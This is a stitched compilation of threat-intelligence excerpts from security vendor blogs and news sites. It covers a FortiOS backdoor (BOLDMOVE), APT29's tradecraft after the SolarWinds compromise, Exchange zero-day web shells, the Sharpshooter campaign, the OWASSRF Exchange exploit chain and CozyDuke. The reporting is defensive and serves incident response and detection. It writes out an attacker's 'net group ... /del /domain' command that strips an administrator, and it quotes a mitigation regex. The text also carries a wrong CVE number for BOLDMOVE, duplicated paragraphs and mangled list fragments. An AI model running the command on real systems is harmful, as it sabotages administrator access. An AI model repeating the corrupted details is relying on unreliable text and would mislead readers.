used for testing. Acknowledgment Mandiant would like to acknowledge Fortinet’s assistance in sharing information, coordinating, and analyzing Mandiant’s findings to verify its veracity.

China Continues to Focus on Network Devices

This incident continues China’s pattern of exploiting internet facing devices, specifically those used for managed security purposes (e.g., firewalls, IPS\IDS appliances etc.). These devices are attractive targets for multiple reasons. First, they are accessible to the internet, and if the attacker has an exploit, they can gain access to a network without requiring any victim interaction. This allows the attacker to control the timing of the operation and can decrease the chances of detection.

The exploits required to compromise these devices can be resource intensive to develop, and thus they are most often used in operations against hardened and high priority targets; often in the government and defense sectors. With BOLDMOVE, the attackers not only developed an exploit, but malware that shows an in-depth understanding of systems, services, logging, and undocumented proprietary formats. Malware running on an internet-connected device can enable lateral movement further into a network and enable command and control (C2) by tunneling commands in and data out of a network.

It is important to note that many of these types of devices do not offer a simple mechanism to view which processes are running on the device’s operating systems. These devices are typically intended to inspect network traffic, searching for anomalies as well as signs of malicious behavior, but are often not inherently protected themselves.

Managed devices may provide only a limited admin interface that allows configuration and viewing/collection of logs

Managed devices may not allow for additional security products, such as Endpoint Detection and Response (EDR) to be installed

Access to core security features may be limited to the device manufacturer

Previous examples of public reporting by Mandiant and others on operations targeting these devices are here:

BOLDMOVE Backdoor

In December 2022, Mandiant identified the BOLDMOVE backdoor associated with the exploitation of CVE-2022-49475 FortiOS vulnerability. BOLDMOVE is written in C and has both Windows and Linux variants, the latter of which is intended to run (at least in part) on Fortinet devices as it reads data from a file proprietary to Fortinet.

Mandiant has not directly observed exploitation of the vulnerability; however, samples of the BOLDMOVE Linux variant have a hard coded C2 IP address that were listed by Fortinet as being involved in the exploitation, suggesting CVE-2022-49475 was exploited to deliver BOLDMOVE. In addition to the Linux variant, Mandiant also revealed a Windows version. Windows versions of BOLDMOVE appear to have been compiled as early as 2021. However, Mandiant has not seen this malware in use in the wild so it is uncertain how it was used. In-depth analysis of the malware is provided later in this post.

Attribution

We assess with low confidence that this operation has a nexus to the People’s Republic of China. China-nexus clusters have historically shown significant interest in targeting networking devices and manipulating the operating system or underlying software which supports these devices. In addition, the geographical and sector targeting is consistent with previous Chinese operations.

Limited technical indicators point to the development of the malware as having been compiled on a machine in the UTC+8 time zone, which includes Australia, China, Russia, Singapore, and other Eastern Asian countries, and on a machine configured to display Chinese characters.

A host survey buffer which is used by the Windows variant of BOLDMOVE in order to provide the C2 with information on the infected host starts with the string “gbk”. The comparable survey buffer of the Linux variant starts with “utf-8”, which indicates that this field designates character encoding. If we are to consider “gbk” in this context, then this is an extension of a Chinese character set

The exploitation of zero-day vulnerabilities in networking devices, followed by the installation of custom implants, is consistent with previous Chinese exploitation of networking devices.

Mandiant has previously reported on significant campaigns impacting networking devices, likely revealing a long-standing interest by China to embed cyber campaigns in the overarching telecommunications and networking architecture used by organizations worldwide:

In April 2021, Mandiant reported extensively on the exploitation of Pulse Secure. Mandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances. In March 2021, Mandiant identified three zero-day vulnerabilities in SonicWall’s Email Security (ES) product that were being exploited in the wild. Mandiant’s investigations informed us that the adversary leveraged these vulnerabilities, with intimate knowledge of the SonicWall application, to install a backdoor, access files and emails, and move laterally into the victim organization’s network. Outlook Mandiant has produced in depth reporting on the growing number of managed, internet-facing and connected devices targeted by Chinese threat actors. This latest campaign may be a continuation of a long-standing practice by China-nexus cyber espionage actors. This campaign and infection vector also should be strong reminders of the importance of keeping up with updates and patches, of externally facing devices or those exposed to the internet. This campaign, and other similar campaigns, offer defenders a unique look into the vulnerabilities and gaps many organizations constantly face when services and networks are managed remotely. Given their configuration, it is very hard to measure the scope and extent of malicious activity that results from exploiting internet facing network devices, as we have little to no information that can indicate those devices are compromised. There is no mechanism to detect malicious processes running on such devices, nor telemetry to proactively hunt for malicious images deployed on them following an exploitation of a vulnerability. This makes network devices a blind spot for security practitioners and allows attackers to hide in them and maintain stealth for long periods, while also using them to gain foothold in a targeted network. BOLDMOVE Linux Analysis BOLDMOVE is a fully featured backdoor written in C and compiled with GCC 11.2.1. When executed it performs a system survey and is capable of receiving commands from a C2 server that in turn allow attackers to control the file system, spawn a remote shell, or relay traffic via the infected host. Based on indicators from the original Fortinet advisory, Mandiant was able to identify multiple Linux versions of BOLDMOVE. There are a core set of features across all observed instances of BOLDMOVE, Windows and Linux, and at least one Linux sample contained extended capabilities enabling it to alter specific behaviors and functionality of Fortinet devices, namely FortiGate Firewalls. Core Features Upon execution, BOLDMOVE attempts to form a session with a hard-coded C2 server. Once it is established, it performs a system survey to collect information that identifies the infected machine to the C2. Information collected is outlined in Table 1. Table 1: System Survey Index Field Value 0 Encoding used for the strings in the survey buffer: utf-8 1 Hard-coded string that seemingly identifies the sample or campaign, e.g., “Cora/c” 2 OS version string. For Linux-based operating systems this string has the format “Linux <linux_version> <utsname.release> <utsname.machine> [<utsname.version>]”, wherein the various fields are obtained from a call to the uname function. For non-Linux operating systems this string has the format <utsname.sysname> <utsname.release> <utsname.machine> [<utsname.version>]. The substring <linux_version> is being constructed by reading data from one of the files /etc/system-release, /etc/os-release (looking for the values of the NAME= and VERSION= keys),/migadmin/ng/vpn/map/pkginfo.json (looking for the value enclosed by the strings ver_s\"":\"" and \"",\""chksum), /etc/debian_version. 3 Host name 4 Comma-separated list of <ip>/<mask> entries that represent network interfaces on the host 5 The effective user ID of the backdoor's process (result of geteuid()) 6 The process ID of the backdoor's process 7 String of the format cwd=<current_dir>\r

Mandiant Blog 4,https://www.mandiant.com/resources/blog/unc2452-merged-into-apt29,"Mandiant has gathered sufficient evidence to assess that the activity tracked as UNC2452, the group name used to track the SolarWinds compromise in December 2020, is attributable to APT29.

This conclusion matches attribution statements previously made by the U.S. Government that the SolarWinds supply chain compromise was conducted by APT29, a Russia-based espionage group assessed to be sponsored by the Russian Foreign Intelligence Service (SVR). Our evaluation is based on firsthand data gathered by Mandiant and is the result of an extensive comparison and review of UNC2452 and our detailed knowledge of APT29.

The merge of UNC2452 into APT29 significantly expands our knowledge of APT29 and showcases an evolving, disciplined, and highly skilled threat actor that operates with a heightened level of operational security (OPSEC) for the purposes of intelligence collection. This blog post builds on our efforts to share information and provide awareness related to APT29’s developments.

Evolving Tradecraft

APT29 is a highly sophisticated group that has continued to evolve and refine its operational and behavioral tactics, techniques, and procedures (TTPs) to better obfuscate activity and limit its digital footprint to avoid detection. The merge expands APT29’s operational profile, emphasizing the group’s well-resourced nature, longevity of operations, time on targets, OPSEC, adaptability, and stealth. The group has been steadily advancing its TTPs and adopting new measures as new technologies emerge.

High Operational Tempo and Scale . Mandiant has tracked APT29 activity since at least 2014 and despite significant public exposure following the SolarWinds compromise in 2020, the group has continued to conduct multiple, large-scale compromises simu ltaneously in different time zones throughout 2020 and 2021 at a high operational tempo. In 2021 and 2022, we observed APT29 conduct large-scale phishing camp aigns targeting diplomatic entities in Europe, North America, and Asia. The scale and scope of this activity suggests the group is well-resourced.

Wide Operational Scope . APT29 has targeted Western and European governments and a range of additional industries including education, telecommunications, government-adjacent organizations, medical research entities, and organizations that provide third party access, such as technology companies and IT and business service providers.

Victimology and Data Theft. APT29 has maintained a consistent focus on aggressively gaining and maintaining access to email mailboxes. More recently, they also targeted cloud-based resources and source code repositories to hunt for data relevant to Russian strategic interests, conduct operational planning, and to use access to third parties as a point of entry to downstream customers.

Figure 1: APT29 Victimology

Mandiant observed APT29 evolve its already advanced tradecraft to adapt to different victim environments and emerging technology in the following ways:

Varying Intrusion Vectors . Since 2020, APT29 increasingly sought to exploit trust relationships between customers and third parties and abuse the supply chain, as evidenced by the prolific nature of the SolarWinds compromise. Mandiant observed APT29 leverage varying operational techniques to gain initial access to victims including stolen credentials, web server compromises, password sprays, and spear phishing. Notably, from 2021 to the present, Mandiant observed APT29 alter its TTPs slightly to deploy Cobalt Strike BEACON via spear phishing campaigns likely due to the availability and success of the publicly available malware, as well as to complicate attribution efforts given the tool’s wide use.

Figure 2: Initial Infection Vectors used by APT29

Heightened OPSEC. APT29 is known for its extensive operational discipline and continues to maintain a strong OPSEC posture across all operations. APT29 demonstrates a heightened level of OPSEC to protect secondary backdoors, lateral movement attempts, and data theft. For instance, APT29 went to considerable lengths to hide its SUNBURST backdoor within the legitimate SolarWinds code during the initial campaign. Additionally, Mandiant previously identified the group attempts to compromise multiple accounts within an environment while keeping the use of each account separate by function, using one for reconnaissance and the others for lateral movement. This reduces the likelihood that detecting one compromised account’s activity could expose the entire scope of the intrusion.



Since 2018, APT29 has consistently enhanced the operation security of its command and control (C2) infrastructure using legitimate services and compromised infrastructure, as well as using domain fronting techniques, and reliance on anonymized internet access, such as using proxy services and the TOR network. In addition, APT29 has continued to demonstrate a clear understanding of security operations, incident response, remediation efforts, and network detection mechanisms. Table 1 provides some examples of additional OPSEC measures taken by the group.

Table 1: Examples of APT29 network- and host-based OPSEC measures Network-based OPSEC Host-based OPSEC C2 Consideration Used legitimate services for C2

Adjusted C2 callout intervals Blending In Matched hostnames to the victim environment’s naming convention

Leveraged native Microsoft tools Infrastructure OPSEC, as detailed in this post Localized “last mile” infrastructure near victim organizations by using residential IP address ranges to authenticate to victim environments

Geolocating Azure infrastructure in the same geography as the victim infrastructure

Used a mixture of TOR, VPS, and VPNs to access victim environments

Used IP address proxy providers that proxy traffic though mobile devices, to make traffic appear as if it was originating from domestic ISPs and devices Separate Infrastructure Separated SUNBURST callback infrastructure from other follow-on malware families to preserve access and protect this toolset if follow-on activity was discovered

Restricted C2 reuse by establishing unique C2 servers per victim and single-use C2 servers for individual hosts Looking Legitimate Modified a legitimate Microsoft DLL to enable the DLL Side Loading of a malicious payload

Masqueraded malicious scheduled tasks, processes, and shortcut files as legitimate tasks, binaries, and documents

Replaced a legitimate binary with a malicious file of the same name and then reinstalled the original file after the malicious binary completed execution

Minimized the size of exfiltrated data and used encrypted connections for data exfiltration Disabling Security Controls Detected and disabled antivirus and system logging features then reenabled these features in some cases upon completion of malicious activity Disabled SysInternals Sysmon and Splunk Forwarders on victim machines that they accessed via Microsoft Remote Desktop Covering Tracks Cleared Windows Event Logs

Established persistence to perform reconnaissance, removed it before moving laterally to another system, and then verified that the persistence was removed

Extensive use of Microsoft’s secure delete tool (SDELETE) following interactive operations on a host Monitoring Remediation Accessed IT personnel mailboxes to monitor remediation efforts and adjust TTPs as needed Using Varying TTPs Employed slight variations in TTPs and malware for spear phishing campaigns

Sophistication . APT29 has a proven ability to adapt quickly during operations. The group uses innovative and novel techniques to bypass detection and strong authentication requirements in victim environments. In more recent operations, their fundamental understanding of native M365 features allowed them to move easily between on-premises and cloud resources without using a substantial amount of malware. We believe these measures, combined with a high level of OPSEC, longevity of the group’s operations, and their time on targets demonstrate a well-resourced and highly sophisticated actor. On-prem to Cloud . APT29’s advanced knowledge of Microsoft tools and cloud environments allows the group to abuse product features to achieve and maintain access—despite strong authentication requirements– without using specific vulnerabilities or deploying custom malware. This enables them to easily pivot from on-premises networks to cloud resources to create persistent access to targets and sensitive data. Mandiant observed APT29 target and move laterally to the M365 environment starting in 2018 by using a combination of seven primary techniques detailed .

Mandiant observed APT29 target and move laterally to the M365 environment starting in 2018 by using a combination of seven primary techniques detailed in our guidance Bypassing Multi-Factor Authentication (MFA): From 2018 to 2020, APT29 used an assortment of methods to satisfy strong authentication requirements in victim environments for lateral movement. These included enrolling devices for MFA or bypassing it via legacy authentication, adding credentials to service principals and app registrations, and utilizing precomputed cookies to bypass MFA requirements and log in successfully without raising any alarms. The group also leveraged legitimate credentials to abuse repeated MFA push notifications to an end user’s legitimate device until the user accepted the authentication. We also observed the group evolve from using Golden Tickets to access sensitive data from on-premises systems to From 2018 to 2020, APT29 used an assortment of methods to satisfy strong authentication requirements in victim environments for lateral movement. These included enrolling devices for MFA or bypassing it via legacy authentication, adding credentials to service principals and app registrations, and utilizing precomputed cookies to bypass MFA requirements and log in successfully without raising any alarms. The group also leveraged legitimate credentials to abuse repeated MFA push notifications to an end user’s legitimate device until the user accepted the authentication. We also observed the group evolve from using Golden Tickets to access sensitive data from on-premises systems to Golden SAML (Security Assertion Markup Language) for victim environments that used cloud hosted resources. Both techniques allow attackers to bypass authentication requirements and access the victim environment with any privileges and as any user, even after a domain-wide password reset of user accounts. Maintaining a Light Malware Footprint : APT29 shifted away from using a toolkit of customized tools to maintaining a relatively light malware footprint since 2018, likely due to extensive open-source reporting on the group’s toolkit. This allows for fewer detection opportunities by anti-virus engines and complicates attribution efforts. The group appears to favor the use of stolen credentials, abusing native Microsoft features to maintain access to victim environments. In some cases, we have observed the group shift from deploying custom tools after gaining a foothold to deploying BEACON. This is likely due to the success, availability, modification potential, and attribution complications provided by BEACON. From 2018 to 2021, APT29 limited their use of custom tools to a little under half of all observed compromises. For compromises during that timeframe that featured custom tools, APT29 used custom malware families including SUNBURST, BEACON droppers RAINDROP and TEARDROP, a credential theft tool called MAMADOGS, and CRIMSONBOX; a .NET tool that extracts the token signing certificate from an ADFS configuration, assisting the group in forging SAML tokens. Speed and Agility . APT29 can quickly adjust their tools and TTPs to adapt to victim environments and to retain access through remediation efforts. In multiple cases, APT29 was able to gain Domain Administrator privileges less than 12 hours after the initial execution of a phishing payload. In 2020, approximately five days after the public disclosure of the SolarWinds supply chain compromise, APT29 moved the persistent BEACON backdoor to an additional system in a new subnet following an email sent from the internal information security team to IT administrators to request an image of the SolarWinds system. This suggests the group was monitoring the organizations' emails and subsequently employed countermeasures to maintain access. Follow the Data. Since 2018, Mandiant observed APT29 adjust their tactics to access victim environments to avoid losing access to critical data located on-premises and in cloud environments. Mandiant observed the group use different methods to gather emails from different victim environments. These include using publicly available tools that harvest local OST and PST files for on-premises systems and switching to abusing service principals, adding permissions to victims' mailboxes and mailbox folders, and using application impersonation for cloud environments.



Outlook and Implications

Since Mandiant began tracking APT29 in 2014, the group has continued to advance its significant technical tradecraft and OPSEC. The consistent and steady advancement in TTPs speaks to its disciplined nature and commitment to stealthy operations and persistence. Merging UNC2452 into APT29 has given us a better understanding of how APT29’s operations have evolved over the years, including how the group further honed its technical skills to bypass security controls, scale TTPs for emerging technology, blend in with victim environments, and hinder detection across all aspects of its operations. Mandiant is almost certain that APT29 will continue to evolve its operational and behavioral TTPs based on its advanced skillset and ability to creatively employ novel TTPs and tools to gain persistent access to targets.

Mandiant Blog 5,https://www.mandiant.com/resources/blog/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities,"Beginning in January 2021, Mandiant Managed Defense observed multiple instances of abuse of Microsoft Exchange Server within at least one client environment. The observed activity included creation of web shells for persistent access, remote code execution, and reconnaissance for endpoint security solutions. Our investigation revealed that the files created on the Exchange servers were owned by the user NT AUTHORITY\SYSTEM, a privileged local account on the Windows operating system. Furthermore, the process that created the web shell was UMWorkerProcess.exe, the process responsible for Exchange Server’s Unified Messaging Service. In subsequent investigations, we observed malicious files created by w3wp.exe, the process responsible for the Exchange Server web front-end.

In response to this activity, we built threat hunting campaigns designed to identify additional Exchange Server abuse. We also utilized this data to build higher-fidelity detections of web server process chains. On March 2, 2021, Microsoft released a blog post that detailed multiple zero-day vulnerabilities used to attack on-premises versions of Microsoft Exchange Server. Microsoft also issued emergency Exchange Server updates for the following vulnerabilities:

Table 1: List of March 2021 Microsoft Exchange CVEs and FireEye Intel Summaries

The activity reported by Microsoft aligns with our observations. FireEye currently tracks this activity in three clusters, UNC2639, UNC2640, and UNC2643. We anticipate additional clusters as we respond to intrusions. We recommend following Microsoft’s guidance and patching Exchange Server immediately to mitigate this activity.

Based on our telemetry, we have identified an array of affected victims including US-based retailers, local governments, a university, and an engineering firm. Related activity may also include a Southeast Asian government and Central Asian telecom. Microsoft reported the exploitation occurred together and is linked to a single group of actors tracked as “HAFNIUM”, a group that has previously targeted the US-based defense companies, law firms, infectious disease researchers, and think tanks.

In this blog post, we will detail our observations on the active investigations we are currently performing. As our experience with and knowledge of this threat actor grows, we will update this post or release new technical details as appropriate. For our Managed Defense Customers, we have launched a Community Protection Event that will provide frequent updates on this threat actor and activity.

We will be discussing these attacks more in an upcoming webinar on Mar. 17, 2021.

From Exploit to Web Shell

Beginning in January 2021, Mandiant Managed Defense observed the creation of web shells on one Microsoft Exchange server file system within a customer’s environment. The web shell, named help.aspx (MD5: 4b3039cf227c611c45d2242d1228a121), contained code to identify the presence of (1) FireEye xAgent, (2) CarbonBlack, or (3) CrowdStrike Falcon endpoint products and write the output of discovery. Figure 1 provides a snippet of the web shell’s code.

Figure 1: Snippet of the web shell help.aspx, crafted to identify the presence of endpoint security software on a victim system

The web shell was written to the system by the UMWorkerProcess.exe process, which is associated with Microsoft Exchange Server’s Unified Messaging service. This activity suggested exploitation of CVE-2021-26858.

Approximately twenty days later, the attacker placed another web shell on a separate Microsoft Exchange Server. This second, partially obfuscated web shell, named iisstart.aspx (MD5: 0fd9bffa49c76ee12e51e3b8ae0609ac), was more advanced and contained functions to interact with the file system. As seen in Figure 2, the web shell included the ability to run arbitrary commands and upload, delete, and view the contents of files.

Figure 2: Snippet of iisstart.aspx, uploaded by the attacker in late January 2021

While the use of web shells is common amongst threat actors, the parent processes, timing, and victim(s) of these files clearly indicate activity that commenced with the abuse of Microsoft Exchange.

In March 2021, in a separate environment, we observed a threat actor utilize one or more vulnerabilities to place at least one web shell on the vulnerable Exchange Server. This was likely to establish both persistence and secondary access, as in other environments. In this case, Mandiant observed the process w3wp.exe, (the IIS process associated with the Exchange web front-end) spawning cmd.exe to write a file to disk. The file, depicted in Figure 3, matches signatures for the tried-and-true China Chopper.

Figure 3: Snippet of China Chopper web shell found on a compromised Exchange Server system

We observed that in at least two cases, the threat actors subsequently issued the following command against the Exchange web server:

net group ""Exchange Organization administrators"" administrator /del /domain.

This command attempts to delete the administrator user from the Exchange Organizations administrators group, beginning with the Domain Controller in the current domain. If the system is in a single-system domain, it will execute on the local computer.

Per Microsoft’s blog, they have identified additional post-exploitation activities, including:

Credential theft via dumping of LSASS process memory.

Compression of data for exfiltration via 7-Zip.

Use of Exchange PowerShell Snap-ins to export mailbox data.

Use of additional offensive security tools Covenant, Nishang, and PowerCat for remote access.

The activity we have observed, coupled with others in the information security industry, indicate that these threat actors are likely using Exchange Server vulnerabilities to gain a foothold into environments. This activity is followed quickly by additional access and persistent mechanisms. As previously stated, we have multiple ongoing cases and will continue to provide insight as we respond to intrusions.

Investigation Tips

We recommend checking the following for potential evidence of compromise:

Child processes of C:\Windows\System32\inetsrv\w3wp.exe on Exchange Servers, particularly cmd.exe .

on Exchange Servers, particularly . Files written to the system by w3wp.exe or UMWorkerProcess.exe .

or . ASPX files owned by the SYSTEM user

user New, unexpected compiled ASPX files in the Temporary ASP.NET Files directory

directory Reconnaissance, vulnerability-testing requests to the following resources from an external IP address: /rpc/ directory /ecp/DDI/DDIService.svc/SetObject Non-existent resources With suspicious or spoofed HTTP User-Agents

Unexpected or suspicious Exchange PowerShell SnapIn requests to export mailboxes

In our investigations to date, the web shells placed on Exchange Servers have been named differently in each intrusion, and thus the file name alone is not a high-fidelity indicator of compromise.

If you believe your Exchange Server was compromised, we recommend investigating to determine the scope of the attack and dwell time of the threat actor.

Furthermore, as system and web server logs may have time or size limits enforced, we recommend preserving the following artifacts for forensic analysis:

At least 14 days of HTTP web logs from the inetpub\Logs\LogFiles directories (include logs from all subdirectories)

directories (include logs from all subdirectories) The contents of the Exchange Web Server (also found within the inetpub folder)

folder) At least 14 days of Exchange Control Panel (ECP) logs, located in Program Files\Microsoft\Exchange Server\v15\Logging\ECP\Server

Microsoft Windows event logs

We have found significant hunting and analysis value in these log folders, especially for suspicious CMD parameters in the ECP Server logs. We will continue updating technical details as we observe more related activity.

Technical Indicators

The following are technical indicators we have observed, organized by the threat groups we currently associate with this activity. To increase investigation transparency, we are including a Last Known True, or LKT, value for network indicators. The LKT timestamp indicates the last time Mandiant knew the indicator was associated with the adversary; however, as with all ongoing intrusions, a reasonable time window should be considered.

BleepingComputer,https://www.bleepingcomputer.com/news/security/op-sharpshooter-connected-to-north-koreas-lazarus-group/,"After analyzing code from a command and control (C2) server used in the global cyber-espionage campaign dubbed 'Sharpshooter', security researchers found more evidence linking it to North Korea's Lazarus threat actor.

The assessment was possible with the help of a government entity and revealed that the operation is broader in scope, more complex and older than initially thought.

The North Korean connection

To hide their true location, the threat actor used the ExpressVPN service that showed connections to the web shell (Notice.php) on a compromised server coming from two IP addresses in London.

However, the IP addresses are rarely a reliable indicator of the attacker's origin or for attribution. The connection to the Lazarus group was obvious by inspecting the tools, strategies, and methods already linked to the North Korean actor.

For instance, Rising Sun was observed in attacks before the discovery of 'Sharpshooter' and shared the tactics, techniques, and procedures (TTPs) seen in operations attributed to Lazarus group.

The three variants of the backdoor (v1.0, v1.1, and v2.0) indicate a clear evolution from Duuzer, used by Lazarus, as they all include its core capabilities.

""These [Rising Sun] implants were all based on the original Backdoor Duuzer source code,"" the researchers say in their report.

The high similarity of the fake job recruitment campaigns both groups used to disguise their attacks, and the fact that Lazarus relied on similar versions of Rising Sun in activity tracked in 2017, point to a connection between the two adversaries.

Malicious components in the framework

Analyzing the code and data from the C2, Ryan Sherstobitoff and Asheer Malhotra from McAfee, along with the company's Advanced Threat Research Team (ATR), discovered new variants of the Rising Sun backdoor that were used since at least 2016.

""The server was used to distribute and infect victims with an upgraded version of Rising Sun with SSL capabilities,"" informs a report shared with BleepingComputer.

The rare opportunity to examine Sharpshooter's backend operations allowed the researchers to create a fuller picture of the activity and interaction between the various tools used by the threat actor.

Local recreation of Sharpshooter's C2 main panel

Getting access to the C2 information helped the researchers get a clear view of the attacker's operations and utilities. It also provided sufficient details to quickly improve detection of malicious activity from this threat by uncovering new tools otherwise hidden by obfuscation techniques.

An alternative method for discovering them is by analyzing network packets, which is more difficult and requires more time.

Another finding in the activity of 'Sharpshooter' were a set of unobfuscated connections from IP addresses in Windhoek, a city in Namibia, Africa. One explanation for this could be that that they used the region as a test zone; another would be that the threat actor runs the operation from those locations, although it could also be a false flag meant to point the researchers on the wrong path.

When 'Sharpshooter' was first discovered, it was believed that the operation started in October 2018. However, a log file on the server indicates that the C2 framework has been active since at least September 2017, and probably ""hosted on different servers over time.""

The threat actor first detected towards the end of last year when it attacked at least 87 organizations around the world in two months' time. Its activity is ongoing.

McAfee researchers will present their findings at this year's RSA security conference in San Francisco."
CrowdStrike Blog,https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/,"CrowdStrike recently discovered a new exploit method (called OWASSRF) consisting of CVE-2022-41080 and CVE-2022-41082 to achieve remote code execution (RCE) through Outlook Web Access (OWA). The new exploit method bypasses URL rewrite mitigations for the Autodiscover endpoint provided by Microsoft in response to ProxyNotShell .

The discovery was part of recent CrowdStrike Services investigations into several Play ransomware intrusions where the common entry vector was confirmed to be Microsoft Exchange.

After initial access via this new exploit method, the threat actor leveraged legitimate Plink and AnyDesk executables to maintain access, and performed anti-forensics techniques on the Microsoft Exchange server in an attempt to hide their activity.

CrowdStrike Services recently investigated several Play ransomware intrusions where the common entry vector was suspected to be the Microsoft Exchange ProxyNotShell vulnerabilities CVE-2022-41040 and CVE-2022-41082. In each case, CrowdStrike reviewed the relevant logs and determined there was no evidence of exploitation of CVE-2022-41040 for initial access. Instead, it appeared that corresponding requests were made directly through the Outlook Web Application (OWA) endpoint, indicating a previously undisclosed exploit method for Exchange.

ProxyNotShell and Exchange Architecture Primer

A Microsoft Exchange server is composed of two major components: the frontend, also known as the Client Access Service, and the backend. The frontend is responsible for handling all client connections and for proxying any given request to the appropriate backend service. The backend services are responsible for handling specific requests made to the frontend such as URLs, also known as endpoints. A simplified Exchange 2016 architecture is illustrated in Figure 1.

In the case of a traditional ProxyNotShell exploit chain, the attack sequence is done in two steps:

First, the Autodiscover endpoint, used for informing clients about services offered by the remote Microsoft Exchange server, is accessed using an authenticated request to the frontend. It is accessed using a path confusion exploit, CVE-2022-41040, allowing the attacker to reach the backend for arbitrary URLs. This type of vulnerability is known as a server-side request forgery (SSRF). In the case of ProxyNotShell, the targeted backend service is the Remote PowerShell service.

A typical web request to the frontend to exploit the SSRF vulnerability on CVE-2022-41040 involves some variation of path confusion that references the Autodiscover endpoint as shown below:

The backend request for a typical ProxyNotShell exploitation is shown below:

Once the PowerShell remoting service can be reached, the second step involves vulnerability CVE-2022-41082 being exploited in order to execute arbitrary commands. A typical log entry showing access to the PowerShell backend is detailed in the Remote PowerShell HTTP logs, located in C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\ , such as in the example below:

New Exploit Method Discovery

CrowdStrike incident responders discovered Remote PowerShell logs similar to log entries for ProxyNotShell exploitation to gain initial access, suggesting the attacker leveraged Remote PowerShell. An example of these log entries can be found below:

By correlating the user, IP address and cafeReqId GUID from the Remote PowerShell HTTP logs to the Exchange frontend, CrowdStrike found a POST request using the mastermailbox@outlook.com mailbox to the following OWA URL, https://{exchange_host}/owa/{email_address]/powershell , corresponding to the IIS log entry below:

The backend request for the new exploitation chain is similar to the example shown below:

This request seemed to show a novel, previously undocumented, way to reach the PowerShell remoting service through the OWA frontend endpoint, instead of leveraging the Autodiscover endpoint.

CrowdStrike incident responders found that renamed Plink and AnyDesk executable creation timestamps on affected backend Exchange servers were closely correlated with PowerShell execution events in the Remote PowerShell logs, indicating the threat actor leveraged the newly discovered exploit chain to drop other tooling for persistent access to the affected Exchange servers. The threat actor cleared Windows Event Logs on affected backend Exchange servers so further information was not available regarding the PowerShell commands leveraged by the threat actors. When CrowdStrike researchers later reproduced the attack, events were present in PowerShell event logs for the creation of an arbitrary process from PowerShell.

Threat Actor POC Leak

CrowdStrike security researchers were working to develop proof-of-concept (POC) code for an exploit method indicative of the logging present after recent Play ransomware attacks. Simultaneously, a threat researcher outside of CrowdStrike discovered an attacker’s tooling via an open repository, downloaded all of the tools, and made them available through a MegaUpload link in a Twitter post.2 The leaked tooling included a Python script, poc.py , that when executed led CrowdStrike researchers to replicate the logs generated in recent Play ransomware attacks.

The code works in two steps. The first step is the previously unknown OWA exploit technique, as seen in the snippet of the threat actor exploit code in Figure 2.

This first step provides a SSRF equivalent to the Autodiscover technique used in ProxyNotShell exploitation. The second step is simply the same exploit used in the second step of ProxyNotShell, allowing code execution through PowerShell remoting.

CrowdStrike researchers replicated the exploit method attack on Exchange systems that had not received the November 8, 2022 patch KB5019758, but could not replicate the attack on systems that had received that patch. There were two (2) privilege escalation vulnerabilities corrected in the patch. The first, CVE-2022-41123, has been revealed by ZDI to be DLL hijacking3 due to the loading of a non-existent component by a privileged executed command. The second, CVE-2022-41080, has not been publicly detailed but its CVSS score of 8.8 is the same as CVE-2022-41040 used in the ProxyNotShell exploit chain, and it has been marked “exploitation more likely.” Based on these findings, CrowdStrike assesses it is highly likely that the OWA technique employed is in fact tied to CVE-2022-41080.

The difference between ProxyNotShell and the newly discovered exploit method we are calling OWASSRF is highlighted in Figure 3.

New Exploit Method Bypasses Microsoft Mitigations for ProxyNotShell

To prevent ProxyNotShell exploitation on older Microsoft Exchange servers, Microsoft released a blog4 advocating for a custom rewrite rule inside the Microsoft IIS server supporting Exchange. This rule was designed to match the decoded URI of any incoming request with the regex (?=.*autodiscover)(?=.*powershell) , so when the decoded URI matches this regex, the request is dropped. For newer on-premises servers, Microsoft provided the same rule through the Exchange Emergency Mitigation Service,5 which installs it automatically. The regex, and thus the rule, will match only the requests made to the Autodiscover endpoint of the Microsoft Exchange server. In the case of the exploit method described here as OWASSRF, the Autodiscover endpoint is not used, in lieu, and the request will not be dropped.

CrowdStrike Recommendations

Organizations should apply the November 8, 2022 patches for Exchange to prevent exploitation since the URL rewrite mitigations for ProxyNotShell are not effective against this exploit method.

If you cannot apply the KB5019758 patch immediately, you should disable OWA until the patch can be applied.

Follow Microsoft recommendations to disable remote PowerShell for non-administrative users where possible.

Deploy advanced endpoint detection and response (EDR) tools to all endpoints to detect web services spawning PowerShell or command line processes. CrowdStrike Falcon will detect the OWASSRF exploit method described in this blog, and will block the method if the prevention setting for Execution Blocking > Suspicious Processes is applied.

Monitor Exchange servers for signs of exploitation visible in IIS and Remote PowerShell logs using this script developed by CrowdStrike Services .

Consider application-level controls such as web application firewalls.

Ensure X-Forwarded-For header is configured to log true external IP addresses for request to proxied services.

Kaspersky Enterprise Security,https://www.kaspersky.com/enterprise-security/mitre/apt29,"What is CozyDuke

CozyDuke - also known as CozyBear, CozyCar and Office Monkeys (among others), and whose activity appears to align with advanced persistent threat APT29 - is a threat actor which came to prominence in 2014 when it is believed to have staged a series of precise attacks on high profile targets including the US White House, Department of State and the Democratic National Committee.

The actor hunts for confidential information stored in the networks of governmental organizations, political groups and think tanks, as well as various individuals involved in defense and geopolitical related research. Kaspersky’s Global Research and Analysis Team (GReAT) has observed signs of its attacks in several countries including Germany, South Korea and Uzbekistan, as well as the US. Among the group’s most interesting characteristics are:

Its extremely sensitive, high profile victims and targets

Its evolving crypto and anti-detection capabilities

Strong functional and structural similarities linking its malware toolset to early MiniDuke and more recent CosmicDuke and OnionDuke components

A relative of MiniDuke?

In early 2013, GReAT observed several incidents that were so unusual they suggested the existence of a new, previously unknown threat actor. What the team uncovered was that the former MiniDuke attackers were still active, and using extremely effective social engineering techniques involving sending malicious PDF documents to compromise their victims.

The PDFs used highly relevant, well-crafted content that fabricated human rights seminar information and Ukraine’s foreign policy and NATO membership plans, and were rigged with exploits attacking Adobe Reader versions 9, 10 and 11, bypassing its sandbox.

Once a system was exploited a unique downloader was dropped onto the victim’s disk, containing a customized micro backdoor written in Assembler.

If the target system met predefined requirements, the malware used Twitter to look for specific tweets from pre-made accounts created by MiniDuke’s command and control (C2) operators, with specific tags labeling encrypted URLs for backdoors. The URLs provided access to the C2s, along with commands and encrypted transfers of additional backdoors onto the system via GIF files.

